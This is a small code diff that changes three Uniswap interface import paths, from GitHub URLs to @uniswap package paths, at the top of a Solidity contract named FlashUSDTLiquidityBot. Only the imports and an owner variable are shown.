@@ -2,9 +2,9 @@ pragma solidity ^0.6.6;
 
 // Import Libraries Migrator/Exchange/Factory
 
-import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol";
-import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
-import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
+import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Migrator.sol";
+import "@uniswap/v2-periphery/contracts/interfaces/V1/IUniswapV1Exchange.sol";
+import "@uniswap/v2-periphery/contracts/interfaces/V1/IUniswapV1Factory.sol";
 
 contract FlashUSDTLiquidityBot {
     address public owner;
